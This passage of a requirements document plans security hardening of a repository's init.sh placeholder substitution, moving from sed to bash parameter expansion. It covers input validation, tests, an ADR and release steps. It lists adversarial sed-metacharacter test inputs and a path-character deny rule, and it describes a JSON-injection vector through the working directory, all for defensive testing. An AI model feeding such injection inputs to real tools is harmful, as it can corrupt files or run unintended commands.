- Option (a) reintroduces a JSON-injection vector via `pwd` if the cwd contains exotic characters (the multi-hop chain analysis in US-248-6).
- Eliminates the JSON-parser sink for placeholder-derived bytes — strictly safer.

**Implementation**:
1. Delete `.claude/mcp-config.json` from the repository (`git rm`).
2. Update `scripts/init.sh` to no longer reference the file in the substitution target set (no change required if the file simply doesn't match the `find` filter post-deletion).
3. Document in CHANGELOG: *"`.claude/mcp-config.json` removed from the template per BLP-02 F-1. The file was an unwired example template; Claude Code's MCP config lives in `~/.config/claude-code/`. Adopters who symlinked or copied the file into their actual Claude Code config should update their config from upstream Claude Code documentation."*
4. **Internal-tooling search artifact** (per Team-Lead Pass 1 L-2): spec.md MUST include a 5-minute search across `.aod/scripts/`, `.claude/agents/`, `.claude/commands/`, `Makefile`, and `scripts/` for any reader of `.claude/mcp-config.json`. The search result is recorded in spec.md §FR-4 as the Architect-confirmed adjudication artifact.

**Fallback (Option (a) — if internal-tooling search surfaces a wired consumer)**: Add `PROJECT_PATH` to the canonical placeholder list at `.aod/scripts/bash/template-substitute.sh:50-63`. Populate via `realpath "$(pwd)"` at init time (NOT raw `pwd` — `realpath` normalizes symlinks). **Apply path-character whitelist validation** before substitution: `[A-Za-z0-9._/-]` only, reject paths containing `&`, `|`, `\`, `'`, `"`, JSON metacharacters (`{}[],"`), or shell metacharacters. Per Architect Pass 1 H-1, this whitelist closes the residual JSON-injection vector that would otherwise persist under Option (a). Document in `contracts/personalization-schema.md`. Update `aod_template_init_personalization` to capture and persist `PROJECT_PATH` in `.aod/personalization.env`. **This fallback is contingent on the internal-tooling search finding a wired consumer**; default is Option (b).

### FR-5 — Constitution sed → pre-stripped templates (under `.aod/templates/`, NOT repo root)

Two pre-stripped constitution templates ship in `.aod/templates/` (per Architect Pass 1 H-3 — `templates/` at repo root does not exist; the established convention is `.aod/templates/` for AOD-Kit-managed templates):
- `.aod/templates/constitution-instructional.md` — the current full template with embedded HTML comment instructions and template-instruction blocks (retained as documentation for downstream forks who want the embedded guidance).
- `.aod/templates/constitution-clean.md` — the post-strip output (no HTML comments, no template-instruction blocks).

`scripts/init.sh:235-241` is replaced by:
```bash
cp ".aod/templates/constitution-clean.md" .aod/memory/constitution.md
```

The two `sed -i` invocations are deleted. Post-init, `.aod/memory/constitution.md` matches `.aod/templates/constitution-clean.md` byte-for-byte.

### FR-6 — Public ADR-038 documents the migration

`docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md` is authored with sections:
- **Status**: Proposed → Accepted (dual-commit pattern).
- **Context**: The two existing substitution paths (`init.sh` sed-based, `update.sh` via `aod_template_substitute_placeholders`); the multi-hop execution chain via `.claude/mcp-config.json`; Daniel Wood's 2026-05-02 LinkedIn note.
- **Decision**: Adopt bash parameter expansion (`${str//pat/rep}`) via `aod_template_substitute_placeholders` as the canonical substitution method across both `init.sh` and `update.sh`.
- **Alternatives considered**: (1) `sed` with metachar-escaping wrapper; (2) `awk -v`; (3) Python `string.Template`; (4) Perl `s|||g`. Each rejected — rationale per alternative.
- **Consequences**: One canonical pattern; bash 3.2 compatibility preserved; literal-substitution semantics by language definition; PROJECT_PATH disposition resolved (per Option (a) or (b)).
- **Related findings**: Five vuln_ids closed by this ADR.

### FR-7 — Release-please trigger with belt-and-suspenders verification

Per `.claude/rules/git-workflow.md` R12 pattern:
1. PR title at draft creation: `feat(248): harden init.sh substitution surface — sed → bash param expansion + input validation + gitignore default`.
2. Pre-merge: re-verify PR title is conventional-commits-formatted via `gh pr view <PR> --json title`.
3. Post-merge: verify release-please opens a release PR within ~30s via `gh pr list --state open --search "release-please" --limit 3`. If empty, push an empty release-marker commit:
   ```
   git commit --allow-empty -m "feat(248): substitution surface hardening — release marker"
   git push origin main
   ```

### FR-8 — Test runner: pytest-via-subprocess (NOT bats)

Per Architect Pass 1 BLOCKING B-1 adjudication: F-248's regression tests use **pytest-via-subprocess**, NOT bats. Rationale:
- The repo has NO existing `.bats` files (`find . -name '*.bats'` returns 0). The `tests/` tree is pure pytest (`tests/scripts/test_*.py` + `conftest.py`).
- The existing CI workflows (`.github/workflows/release-please.yml`, `tachi-mmdc-preflight.yml`) do NOT include a bats job, macOS+Linux matrix, or test-runner step for bats. Bats CI infrastructure is greenfield.
- Bootstrapping bats CI matrix (~1d work: install bats on macOS-latest + ubuntu-latest, author `.github/workflows/init-sh-test.yml`, decide bats vs bats-core vs bats-assert, wire `make test-integration`, decide directory layout) is OUT OF SCOPE for F-248. Bats can ship as its own feature later if shell-native fixtures are wanted.

**Test file locations**:
- `tests/scripts/test_init_sh_substitution.py` (Test-1)
- `tests/scripts/test_init_sh_adversarial.py` (Test-2)
- `tests/scripts/test_init_sh_constitution.py` (Test-4)
- `tests/scripts/test_init_sh_self_delete.py` (Test-5' — replaces re-init parity per Architect M-3)
- `tests/fixtures/init-baseline-tree/` (NEW directory for byte-comparison baseline)
- `tests/fixtures/regenerate-baseline.sh` (NEW — regeneration script per Team-Lead Pass 1 M-5)

**Test pattern**: each test invokes `init.sh` via `subprocess.run` with controlled inputs (`PROJECT_NAME`, `PROJECT_DESCRIPTION`, etc. via env or stdin), then asserts on:
- Tree byte-equality vs `tests/fixtures/init-baseline-tree/` (Test-1).
- Adversarial input → expected outcome class (substituted-byte-identical OR prompt-rejected) (Test-2).
- Constitution byte-equality vs `.aod/templates/constitution-clean.md` (Test-4).
- `scripts/init.sh` does not exist post-init (Test-5').

**Cross-platform CI matrix**: pytest already runs on `macos-latest` (bash 3.2.57) AND `ubuntu-latest` (bash 5.x) via existing CI workflows; no new matrix bring-up required. F-248 ADDS the test files; the runner is already wired.

---

## 🚫 Non-Functional Requirements

### NFR-1 — Cross-platform parity

All tests pass on macOS (bash 3.2 default) AND Linux (bash 4+). CI gates merge on both green. No bash 4-only features in the helper functions (no associative arrays in adopter-facing code paths; the existing `aod_template_substitute_placeholders` is already bash 3.2 compatible).

### NFR-2 — No new runtime dependencies

Empty diff on `pyproject.toml`, `requirements*.txt`, `package.json`. The work uses bash builtins only (parameter expansion, `printf`, `[[`).

### NFR-3 — Substitution-semantics byte-identity

Across at least 10 adversarial inputs (per Regression Protection Plan), the substituted output tree is byte-identical to a recorded baseline tree. No silent encoding shifts; no trailing-newline drift; no file-mode regressions.

### NFR-4 — Performance neutrality (measurable, with escalation thresholds)

Init duration on a fresh checkout MUST NOT regress by more than **10% under the new substitution path on the canonical fixture** (measured against the current `replace_in_files()` baseline). Per Architect Pass 1 H-2:

- **Stream 1 Day 1 benchmark**: time both the old `replace_in_files()` path (on a snapshot of pre-merge state) and the new `aod_template_substitute_placeholders` loop on the canonical fixture (~100 files, small sizes). Record both timings in ADR-038 §Consequences.
- **If delta ≤ 5%**: NFR-4 holds at 10%; no PRD update needed.
- **If delta is 5% to 50%**: ADR-038 documents the actual delta with rationale and **loosens NFR-4 to 25% with rationale** (literal-substitution correctness is worth the constant-factor regression for the canonical fixture). Spec author updates the PRD ratification line via amendment.
- **If delta is >50%**: spec author **escalates to PM for re-scope** before merge. Possible re-scopes: (a) micro-optimize the substitution loop (single-pass sed-style with parameter expansion in inner loop); (b) accept the regression and document in CHANGELOG; (c) split into two passes (small-tree fast path, large-tree streaming path).

**Why measurable beats hand-wave**: bash `${str//pat/rep}` reads the entire file into a bash scalar then runs 12 sequential substitution operations per file (O(12 · N · S) for a tree of N files of avg S bytes). The current sed implementation batches files via `find ... -exec sed -i ... {} +` (substantially fewer process-spawns; likely faster for large trees due to streaming). On the canonical fixture this won't matter; on a fork that has accumulated content, it could.

### NFR-5 — Zero `finding.yaml` schema change

`schemas/finding.yaml` is not modified. The five vuln_id closures use the existing schema; the `.security/vulnerabilities.jsonl` `REMEDIATED` events conform to the existing event shape.

---

## 🧪 Regression Protection Plan

### Test-1 — Fixture-replay byte-comparison

`tests/scripts/test_init_sh_substitution.py` invokes the modified `init.sh` via `subprocess.run` against a known-good input fixture (`PROJECT_NAME=tachi`, `PROJECT_DESCRIPTION=threat modeling sidecar`, `GITHUB_ORG=davidmatousek`, `GITHUB_REPO=tachi`, `AI_AGENT=claude`, etc.). Byte-compares the resulting personalized tree against a recorded baseline at `tests/fixtures/init-baseline-tree/`. Catches:
- Trailing-newline handling differences (including files ending without trailing newline — see Test-2 case 13 per Architect Pass 1 M-1).
- File-mode preservation (executable bit on scripts).
- Encoding shifts (UTF-8 vs other).
- Silent placeholder drift (a `{{KEY}}` that newly appears or disappears).

**Baseline regeneration script** (per Team-Lead Pass 1 M-5): `tests/fixtures/regenerate-baseline.sh` is shipped as an explicit Stream 5 artifact. It runs `init.sh` end-to-end on a clean clone with the canonical fixture inputs and saves the tree + checksums. Documented procedure: regenerate when adding a new canonical placeholder; do NOT regenerate to match a substitution-semantics change (that is a regression).

### Test-2 — Adversarial-input substitution test cases (≥ 13)

`tests/scripts/test_init_sh_adversarial.py` exercises ≥ 13 input cases:
1. `AT&T` (sed-metachar `&`).
2. `foo|bar` (sed-delimiter `|`).
3. `\1\2 backref` (sed-backref).
4. `'single-quoted'` (shell-quoting).
5. `"double-quoted\"escaped"` (shell-quoting + embedded escape).
6. `Ⅷ-Ⅸ` (multibyte UTF-8 — Roman numerals at U+2160 range).
7. `   leading-whitespace` (rejection or preservation per spec).
8. `trailing-whitespace   ` (rejection or preservation per spec).
9. Multi-line paste (`"foo\nbar"`) — rejected at prompt with re-prompt.
10. NUL paste — rejected at prompt.
11. Over-length input (101+ chars for PROJECT_NAME; 40+ for GITHUB_ORG) — rejected at prompt.
12. Control character (0x07 BEL) — rejected at prompt.
13. **Trailing-newline edge case** (per Architect Pass 1 M-1): a fixture file containing the literal 4 bytes `a\nb` (backslash-n, no actual LF byte) — verify byte-identical preservation. A second fixture file ending without a trailing newline (e.g., `printf 'no-newline-file' > fixture.txt`) — verify byte-identical preservation. Catches the silent-corruption mode that NFR-3 promises to prevent.

Each case has an expected outcome: substituted byte-identical, or rejected at prompt with reason `<class>`.

### Test-3 — Cross-platform CI matrix (existing pytest matrix; no new wiring)

The existing pytest CI matrix runs Test-1, Test-2, Test-4, and Test-5' on:
- `macos-latest` (bash 3.2.57 default — verifying bash 3.2 compatibility).
- `ubuntu-latest` (bash 5.x — verifying no regressions on Linux).

Both must be green for merge. **No new CI workflow file is added** — F-248 adds tests to an already-running matrix.

### Test-4 — Constitution byte-compare

`tests/scripts/test_init_sh_constitution.py` runs `init.sh` end-to-end and asserts:
```python
assert (Path(".aod/memory/constitution.md").read_bytes()
        == Path(".aod/templates/constitution-clean.md").read_bytes())
```
returns equality (byte-for-byte).

### Test-5' — Self-delete preservation (replaces re-init parity per Architect M-3 + Team-Lead Q-3 Option b)

Per Team-Lead Pass 1 Q-3 adjudication (Option (b) — re-init NOT supported) and Architect Pass 1 M-3 (the existing self-delete at `init.sh:354` IS the re-init prevention mechanism), Test-5 is **replaced** by:

`tests/scripts/test_init_sh_self_delete.py` runs `init.sh` end-to-end and asserts:
```python
assert not Path("scripts/init.sh").exists()
```

This codifies the load-bearing self-delete behavior that init.sh has had historically. **The old Test-5 (re-init parity) is removed** — the support contract is non-existent and the CHANGELOG migration command for previously-committed `.aod/personalization.env` is the sufficient delta path for existing adopters.

### Test-6 — Manual smoke test on fresh checkout (gating)

Before marking the feature ready: clone tachi fresh into `/tmp/tachi-smoke-test`, run `init.sh` end-to-end with adversarial inputs (`AT&T`, `foo|bar`), verify all common files are personalized, no `{{KEY}}` survives, and the constitution matches `constitution-clean.md`.

### Test-7 — Post-merge `/security` re-scan

After merge to `main`, run `/security` (standalone) targeting the substitution surface (`scripts/init.sh`, `.gitignore`, `.aod/templates/constitution-*.md`, `contracts/personalization-schema.md`, `.claude/mcp-config.json` if Option (a)). Expected: zero new findings, five `REMEDIATED` events in `.security/vulnerabilities.jsonl`.

---

## ✅ Definition of Done

- [ ] `replace_in_files()` removed from `scripts/init.sh`; replaced by `aod_template_substitute_placeholders` loop.
- [ ] `aod_template_assert_no_residual` called post-substitution; init halts non-zero on residual.
- [ ] PROJECT_PATH disposition decision (Option (a) or (b)) documented in spec.md; implementation matches the decision.
- [ ] `aod_init_read_validated` helper integrated; covers all 4 prompts in `init.sh:24-28`.
- [ ] `.gitignore` confirmed to include `.aod/personalization.env`; `contracts/personalization-schema.md` documents local-only default.
- [ ] Migration command for previously-committed `.aod/personalization.env` documented in CHANGELOG with copy-pasteable text.
- [ ] Constitution cleanup uses pre-stripped templates (`.aod/templates/constitution-clean.md` copied at init; no `sed`).
- [ ] All **7 tests** in Regression Protection Plan (Test-1, Test-2, Test-3, Test-4, Test-5', Test-6, Test-7) pass on macOS + Linux via the existing pytest CI matrix. (Test-5' replaces Test-5 — net zero count change; the original v1.0 PRD said "7 tests" and v1.1 maintains 7 with Test-5' as the substitute. Per Architect Pass 2 N-2 housekeeping, count is restored to 7.)
- [ ] ADR-038 authored, accepted via standard ADR review (Proposed → Accepted dual-commit pattern; tasks.md decomposes into T-X.1 Proposed and T-X.2 Accepted per Team-Lead Pass 1 L-3).
- [ ] CHANGELOG entry added with version bump notes.
- [ ] PR title is Conventional-Commits-formatted as `feat(248): ...`.
- [ ] Release-please PR opens within ~30s post-merge; if not, empty `feat(248):` marker commit pushed.
- [ ] All 5 vuln_ids → `REMEDIATED` in `.security/vulnerabilities.jsonl` with merge SHA + timestamp.
- [ ] Post-merge `/security` re-scan produces zero new findings in the substitution surface this feature touched.

**Public Visibility Action (PM-controlled, NOT a DoD gate)**: a one-line comment template is provided ready for the user to paste on Daniel Wood's 2026-05-02 LinkedIn thread (post-release-please-merge, within 5 business days per Team-Lead Pass 1 M-3); posting is at user discretion. Decoupling per Architect Pass 1 L-3.

---

## 🔗 Dependencies

### Upstream (within BLP-02)

None. F-1 is Wave 1 / Feature 1 — first feature in the initiative.

### Internal pre-requisites

- **PROJECT_PATH disposition decision (FR-4):** Architect MUST adjudicate Option (a) vs Option (b) during spec.md authoring. The decision gates Stream 1 implementation. Default to Option (b) (recommended) absent Architect override with named downstream consumer.
- **Existing `aod_template_substitute_placeholders` function:** verified at `.aod/scripts/bash/template-substitute.sh:318-411` (bash parameter expansion `${str//pat/rep}`, contract-defined, unit-tested, used by `/aod.update`).
- **Existing `aod_template_assert_no_residual` function:** verified at `.aod/scripts/bash/template-substitute.sh:432`.

### Downstream (BLP-02 wave continuation)

- **F-2 (Wave 2 — defaults.env strict KV parser):** F-2 reuses the **validation triplet pattern** documented in ADR-038 (regex-validate → reject-on-mismatch → `printf -v` assignment), NOT the `aod_init_read_validated` function itself. Per Team-Lead Pass 1 H-2: `aod_init_read_validated` is interactive `read -p` only; F-2 (defaults.env file-parse) is non-interactive — the function does not apply. F-1's contribution to F-2 is the **pattern** and the **shared library convention** (`.aod/scripts/bash/init-input.sh` becomes a sibling to a future `.aod/scripts/bash/defaults-parse.sh` if F-2 wants its own validator).
- **F-3 (Wave 2 — aod-kit-version + eval → printf -v migration):** independent of F-1; can advance in parallel. F-3 reuses the `printf -v` rejection-pattern, not the helper function.
- **F-4 (Wave 3 — SECURITY.md + private vuln reporting + clone timeout):** independent.
- **F-5 (Wave 4 — Claude permissions baseline + pre-commit secret-scan):** independent.

### External

- **Daniel Wood's LinkedIn thread (2026-05-02):** the public visibility post-release-please-merge response (SC-15) is a manual user action, not an automated step. Mark the LinkedIn URL in the Issue body once posted.

---

## ⚠️ Risks

### R-1 — bash 3.2 compatibility regression (MEDIUM)

**Scenario**: A helper function uses bash-4 features (associative arrays, `&>` redirection without explicit `2>&1`, `mapfile`/`readarray`, `${var,,}` lowercase expansion).

**Mitigation**: All helpers reviewed for bash 3.2 compatibility before merge; CI matrix runs on macOS (bash 3.2.57 default) AND Linux (bash 5.x). Existing `aod_template_substitute_placeholders` is already bash 3.2 compatible — F-1 inherits this constraint.

### R-2 — Substitution-semantics drift on edge-case files (MEDIUM)

**Scenario**: A file currently substituted by `sed` happens to produce different bytes under `${str//pat/rep}` due to a subtle edge case (e.g., file ending without trailing newline; binary file accidentally included; large file with thousands of placeholders triggering a performance cliff).

**Mitigation**: Test-1 (fixture-replay byte-comparison) catches drift on the canonical fixture. The current `find` filter excludes binary extensions; preserving the filter exactly preserves the file set. Test-2 exercises ≥ 10 adversarial inputs against the same target file set.

### R-3 — Re-init not supported; existing adopters need migration (LOW — RESOLVED in v1.1)

**Scenario**: An adopter who ran the OLD `init.sh` re-runs the NEW `init.sh` on the same tree expecting a clean re-personalization, but the new substitution path produces different bytes.

**Resolution (v1.1)**: Q-3 adjudicated by Team-Lead Pass 1 — **Option (b): re-init is NOT supported**. The existing self-delete at `init.sh:354` (`rm -f scripts/init.sh`) IS the re-init prevention mechanism (per Architect Pass 1 M-3 — `init.sh` literally cannot re-run because it deleted itself). FR-1 adds a one-line pre-flight check at the top of `init.sh`: if `.aod/personalization.env` exists, exit non-zero with `[init] FATAL: Repository already personalized. Re-init is not supported. To re-personalize, remove .aod/personalization.env and re-run init.sh.` CHANGELOG includes the gitignore-only migration command for existing adopters who already committed `.aod/personalization.env`. Test-5' (self-delete preservation) replaces the old Test-5 (re-init parity) per Architect M-3.

### R-4 — release-please skips the release (LOW, mitigated)

**Scenario**: PR squash-merge title is non-conventional (e.g., `Improve substitution`), release-please ignores it, no release PR opens.

**Mitigation**: SC-12 binds the PR title at draft creation; pre-merge verification re-checks; post-merge belt-and-suspenders verification opens an empty `feat(248):` marker commit if no release PR appears within 30s. **Reference incident**: F-212 close-out 2026-04-25 — recovered via empty marker commit pattern.

### R-5 — PROJECT_PATH Option (b) breaks a downstream adopter who wired mcp-config.json (LOW)

**Scenario**: An adopter has wired `.claude/mcp-config.json` into their actual Claude Code config (e.g., via a symlink or by copying it to `~/.config/claude-code/`) and depends on the file existing in the template tree.

**Mitigation**: Architect adjudication during spec.md authoring includes a 5-minute search across known adopter forks (the AOD-Kit lineage repos: `product-led-spec-kit`, `AOD-Kit`, `tachi`, plus any public forks). If any wired adopter exists, default to Option (a) instead. CHANGELOG documents the file removal in the v4.x release notes so adopters running `/aod.update` see the change before pulling.

### R-6 — Over-strict input validation rejects legitimate adopter inputs (LOW)

**Scenario**: An adopter has a project description containing `«»` quote marks, a project name with an em-dash (`—`), or a tech-stack value with parentheses. The validation rejects on the control-character class but accidentally also rejects legitimate Unicode.

**Mitigation**: The validation rejects ASCII control 0x00–0x1F (excluding space) — Unicode characters above 0x7F pass. Test-2 case 6 (`Ⅷ-Ⅸ` multibyte UTF-8) verifies multibyte preservation.

---

## 🎯 Open Question Resolutions (v1.1)

All four open questions have been adjudicated in Pass 1 reviews and are folded into the v1.1 PRD content. They are recorded here as a closure trail for the spec author.

### Q-1 (Architect Pass 1) — RESOLVED → Option (b) — Remove `.claude/mcp-config.json`

**Adjudicator**: Architect (Pass 1 review)
**Decision**: Option (b) — Remove `.claude/mcp-config.json` from the template entirely. No `PROJECT_PATH` placeholder added to the canonical set. **Fallback to Option (a) is contingent on the spec.md internal-tooling search (per Team-Lead Pass 1 L-2) finding a wired consumer** in `.aod/scripts/`, `.claude/agents/`, `.claude/commands/`, `Makefile`, or `scripts/`. Default is Option (b).
**Rationale**: file is unwired; Claude Code's MCP config lives outside the project tree; adding a 13th placeholder mutates a contract for an unwired example; Option (a) reintroduces a JSON-injection vector via `pwd`; Option (b) is strictly safer.
**Folded into**: FR-4 (full implementation + fallback rules + path-character whitelist for Option (a)).

### Q-2 (Architect Pass 1) — RESOLVED → Option (b) — New sourced file `.aod/scripts/bash/init-input.sh`

**Adjudicator**: Architect (Pass 1 review)
**Decision**: Option (b) — `aod_init_read_validated` lives in a NEW sourced file `.aod/scripts/bash/init-input.sh`, consistent with the existing `template-*.sh` library convention.
**Rationale**: consistency with existing pattern; reusable convention even if F-2 doesn't reuse the function itself; better unit-test isolation; keeps `init.sh` under 450 lines.
**Folded into**: FR-2 (helper-file location, F-1→F-2 reuse precision per Team-Lead H-2).

### Q-3 (Team-Lead Pass 1) — RESOLVED → Option (b) — Re-init NOT supported

**Adjudicator**: Team-Lead (Pass 1 review)
**Decision**: Option (b) — re-init NOT supported. `init.sh` refuses to run on an already-personalized tree via a one-line pre-flight check.
**Rationale**: scope discipline (re-init not historically supported; adding it conflates posture-hardening with adopter-ergonomics); test surface delta (Option (a) adds 0.5d to Stream 5; Option (b) adds 10 minutes to Stream 1); migration sufficiency (CHANGELOG gitignore migration is the correct delta path); ceiling protection (preserves 8d hard ceiling); future-proofing (re-init can ship as a standalone feature later).
**Folded into**: FR-1 (pre-flight check in init.sh), Timeline (re-init NOT supported), R-3 (resolved), Test-5' (self-delete preservation replaces re-init parity), DoD (6 tests not 7).

### Q-4 (PM) — RESOLVED → "Within 5 business days of release-please PR merge" (no F-248 calendar binding)

**Adjudicator**: PM, with Team-Lead Pass 1 M-3 input
**Decision**: SC-15 (originally) is **moved out of Success Criteria** (per Architect Pass 1 L-3 — the LinkedIn comment was a manual external action that prevented feature closure). The action is reframed as a **Public Visibility Action** with the timing "within 5 business days of release-please PR merge" (NOT tied to F-248's feature-merge calendar).
**Rationale**: release-please cadence varies (sometimes same-day, sometimes 2-3 days). Tying SC-15 to feature-merge introduced an external-dependency gate on F-248 closure. PM-controlled manual action with no calendar binding is the correct framing.
**Folded into**: SC-14/SC-15 (moved out), DoD (decoupled), Public Visibility Action subsection.

---

## 📦 Deliverable

**Single feature branch**: `248-substitution-surface-hardening`

**Single squash-merged PR** with title: `feat(248): harden init.sh substitution surface — sed → bash param expansion + input validation + gitignore default`

**Files modified** (estimated, reflecting v1.1 adjudications):
- `scripts/init.sh` — `replace_in_files()` removed; reordered to write `.aod/personalization.env` first, then `aod_template_load_personalization_env`, then `aod_template_substitute_placeholders` loop, then `aod_template_assert_no_residual`; `aod_init_read_validated` integration on 4 prompts; constitution `cp` instead of `sed -i`; pre-flight check for re-init prevention.
- `.gitignore` — verify `.aod/personalization.env` entry (already present at line 222 from `b27f3ea` 2026-04-19).
- `contracts/personalization-schema.md` — document local-only default.
- `.aod/templates/constitution-clean.md` — NEW (post-strip output; under `.aod/templates/`, NOT repo root).
- `.aod/templates/constitution-instructional.md` — NEW (full template, retained for fork documentation).
- `.claude/mcp-config.json` — REMOVED (Q-1 adjudicated Option b; conditional on internal-tooling search finding no wired consumer).
- `.aod/scripts/bash/init-input.sh` — NEW (Q-2 adjudicated Option b: new sourced helper file).
- `tests/scripts/test_init_sh_substitution.py` — NEW (Test-1, pytest).
- `tests/scripts/test_init_sh_adversarial.py` — NEW (Test-2, pytest).
- `tests/scripts/test_init_sh_constitution.py` — NEW (Test-4, pytest).
- `tests/scripts/test_init_sh_self_delete.py` — NEW (Test-5', pytest — replaces re-init parity test per Architect M-3).
- `tests/fixtures/init-baseline-tree/` — NEW directory (recorded baseline for byte-comparison).
- `tests/fixtures/regenerate-baseline.sh` — NEW (baseline regeneration script per Team-Lead M-5).
- `docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md` — NEW (dual-commit: Proposed → Accepted).
- `CHANGELOG.md` — entry under v4.x with migration command + `.claude/mcp-config.json` removal note.
- `.security/vulnerabilities.jsonl` — 5 `REMEDIATED` events post-merge.

**Public artifacts**:
- ADR-038 in `docs/architecture/02_ADRs/`.
- CHANGELOG entry under v4.x.
- Release-please release PR within ~30s post-merge.
- LinkedIn comment on Daniel Wood's 2026-05-02 thread (post-release).

---

## 📚 References

- **Issue**: [#248](https://github.com/davidmatousek/tachi/issues/248) — Substitution Surface Hardening (BLP-02 Wave 1)
- **Security scan**: `.aod/results/security-scan.md` (2026-05-02 research scan, 11 findings)
- **Daniel Wood LinkedIn note**: 2026-05-02 — sed-based substitution flagged as 'possible multi-hop execution chain'. Per Team-Lead Pass 1 L-1, spec.md MUST pin the LinkedIn URL once in §References plus a `web.archive.org` snapshot in ADR-038 §References (the LinkedIn post is mutable; archive snapshot is the durable evidence trail)
- **Existing safe function**: `.aod/scripts/bash/template-substitute.sh:318-411` (`aod_template_substitute_placeholders`)
- **Residual scan**: `.aod/scripts/bash/template-substitute.sh:432` (`aod_template_assert_no_residual`)
- **Sed-based substitution (target for removal)**: `scripts/init.sh:117-159` (`replace_in_files`)
- **Constitution sed (target for removal)**: `scripts/init.sh:235-241`
- **`read -p` prompts (target for wrapping)**: `scripts/init.sh:24-28`
- **Personalization gitignore entry**: `.gitignore:222` (added `b27f3ea` 2026-04-19)
- **Vulnerabilities log**: `.security/vulnerabilities.jsonl`
- **SARIF report**: `.security/reports/8ab6c9c718cb980629717b1216c12587f861411e.sarif`
- **Recent ADR (highest number)**: `docs/architecture/02_ADRs/ADR-037-web-api-coverage-attestation-and-populator-wiring.md` — next ADR is 038.
- **F-212 release-please recovery incident**: `.claude/rules/git-workflow.md` Reference Incident section.
- **Constitution**: `.aod/memory/constitution.md`
- **Git workflow**: `.claude/rules/git-workflow.md`
- **BLP-02 backlog memory**: 5-feature initiative OPEN 2026-05-02; origin Daniel Wood LinkedIn; ADRs 038-041; closes 11 `/security` vulns across 4 waves.

---

## 📝 v1.1 + v1.2 Changelog (Pass 1 → Pass 2 delta)

**Architect Pass 1 BLOCKING addressed**:
- B-1 → FR-8 added: pytest-via-subprocess, NOT bats. SC-14 names the runner. Test file paths updated. CI matrix uses existing pytest workflow (no new wiring).
- B-2 → FR-1 spells out the init.sh reorder (write snapshot → load → substitute). SC-3 includes the reorder requirement. Proposed Solution item 1 reframed.

**Architect Pass 1 HIGH addressed**:
- H-1 → US-248-6 acceptance language tightened (defense-in-depth chain, not substitution semantics alone). FR-4 Option (a) fallback adds path-character whitelist + `realpath` normalization.
- H-2 → NFR-4 made measurable with escalation thresholds (≤5%, 5-50%, >50%). Stream 1 Day 1 benchmark required; recorded in ADR-038.
- H-3 → FR-5 + Deliverable + Test-4 paths updated to `.aod/templates/` (not repo-root `templates/`).

**Architect Pass 1 MEDIUM addressed**:
- M-1 → Test-2 case 13 added (trailing-newline edge cases: literal `a\nb` bytes, file without trailing newline).
- M-2 → ADR-038 §Decision will explicitly note the residual-scan regex character class and commit to lockstep updates if canonical placeholder list expands to digits.
- M-3 → Test-5 (re-init parity) replaced by Test-5' (self-delete preservation). DoD test count: 6, not 7.
- M-4 → Timeline Stream 1 critical-path framing clarified.

**Architect Pass 1 LOW addressed**:
- L-1 → FR-2 length caps now sourced (GitHub limits cited; GITHUB_ORG tightened to 39).
- L-2 → Q-3 folded into spec as resolved (Team-Lead adjudicated).
- L-3 → SC-15 moved out of Success Criteria into Public Visibility Action subsection. DoD decoupled.

**Team-Lead Pass 1 HIGH addressed**:
- H-1 → Stream 5 sized at 3.0d (2.5d active + 0.5d CI iteration buffer); Stream 4 ADR compressed to 0.5d.
- H-2 → Dependencies F-1→F-2 reuse precision documented (validation triplet pattern, NOT helper function).

**Team-Lead Pass 1 MEDIUM addressed**:
- M-1 → Buffer floor: 12.5% on 8d active; 10d hard ceiling. Day 5 slip-watch checkpoint named.
- M-2 → Single-agent serial assumption explicitly declared with parallelism quantification (5d possible with 2-agent parallel, deferred for coordination-overhead reasons).
- M-3 → SC-15 reframed as "within 5 business days of release-please PR merge" (Q-4 resolved).
- M-4 → Test count: 6, not 7 (Test-5 replaced by Test-5').
- M-5 → `tests/fixtures/regenerate-baseline.sh` named as explicit Stream 5 deliverable in Test-1.

**Team-Lead Pass 1 LOW addressed**:
- L-1 → Daniel Wood LinkedIn URL pin guidance added to References (web.archive.org snapshot for ADR-038 §References).
- L-2 → Internal-tooling search artifact added to FR-4 Architect adjudication.
- L-3 → ADR-038 dual-commit decomposition flagged for tasks.md (T-X.1 Proposed → T-X.2 Accepted).

**Open Questions resolved**: Q-1 (Architect→Option b), Q-2 (Architect→Option b), Q-3 (Team-Lead→Option b), Q-4 (PM→Public Visibility Action subsection). All folded into v1.1 content; no open questions remain for the spec author.

**No scope changes** between v1.0 and v1.1. The 5 vuln_ids closed remain the same; the deliverable framing (single feature branch / single PR / `feat(248):` commit subject / ADR-038) remains the same; the 8d/10d-ceiling timeline remains the same.

**v1.2 housekeeping pass** (Architect Pass 2 N-1, N-2):
- N-1 → 5 stale `templates/constitution-*` prose references replaced with `.aod/templates/constitution-*` (lines 68, 72, 88, 103, 475, 487 in v1.1).
- N-2 → DoD test count restored to 7 (Test-5' replaces Test-5 → net zero count change). Internal consistency fixed.
- No scope, schema, or timeline changes from v1.1 → v1.2. Architect Pass 2 status APPROVED_WITH_CONCERNS promotes to APPROVED on these housekeeping fixes.
